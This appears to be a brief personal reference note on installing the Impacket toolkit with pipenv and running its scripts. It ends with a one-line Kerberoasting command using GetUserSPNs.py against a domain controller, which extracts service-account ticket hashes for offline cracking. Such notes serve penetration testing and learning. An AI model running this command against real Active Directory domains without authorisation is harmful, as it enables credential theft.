# Impacket 

Note: This doc should be placed in an eventual AD folder, once I get that far.
## Install

install impacket with:
`pipenv install impacket`
this will create a virtualenv in `/home/${local_user}/.local/share/virtualenvs/${VENV_NAME}`
you can then:
```
export IMPACKET_SCRIPTS=$(pipenv --venv)/bin
```
Now, you can run impacket scripts with:
```
python3  ${IMPACKET_SCRIPTS}/${script} ...
```

## Kerberoasting

```
python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${USER}
```


